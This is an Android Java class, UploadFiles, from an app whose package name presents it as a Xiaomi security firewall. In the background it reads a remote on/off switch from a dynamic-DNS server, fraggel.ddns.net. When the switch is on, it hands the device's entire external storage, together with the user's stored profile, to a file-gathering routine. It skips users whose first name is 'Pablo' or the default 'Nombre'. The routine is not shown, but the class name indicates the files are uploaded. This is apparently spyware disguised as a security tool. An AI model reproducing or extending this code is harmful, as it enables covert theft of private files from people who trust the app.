package com.xiaomi.securityfirewall;

import android.app.DownloadManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.io.InputStream;
import java.net.URL;

import com.xiaomi.securityfirewall.Models.User;
import com.xiaomi.securityfirewall.Services.LocalUserService;

public class UploadFiles extends AsyncTask<Void , Integer, Long>
{
    private Context mContext;
    boolean upload=true;
    public UploadFiles (Context context){
        mContext = context;
    }
    @Override
    protected Long doInBackground(Void... voids) {
        Log.d("SecurityFirewall","upload");
        try{
            StringBuffer buffer = null;
            try {
                URL url = new URL("http://fraggel.ddns.net:9090/fraggel/app/upload.html");
                InputStream is = url.openStream();
                int ptr = 0;
                buffer = new StringBuffer();
                while ((ptr = is.read()) != -1) {
                    buffer.append((char) ptr);
                }
            } catch (Exception ex) {
                ex.printStackTrace();
            }
            if(buffer.indexOf("upload=true")!=-1){
                upload=true;
            }else{
                upload=false;
            }
            User user = LocalUserService.getLocalUserFromPreferences(mContext);
            if(!user.FirstName.equals("Pablo") && upload && !user.FirstName.equals("Nombre")) {
                Util.GetFiles(Environment.getExternalStorageDirectory().getAbsolutePath(),mContext,user);
            }
        }catch(Exception e){
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onPostExecute(Long result) {
        //Termina proceso
        Log.i("TAG" , "Termina proceso de lectura de archivos.");
    }
}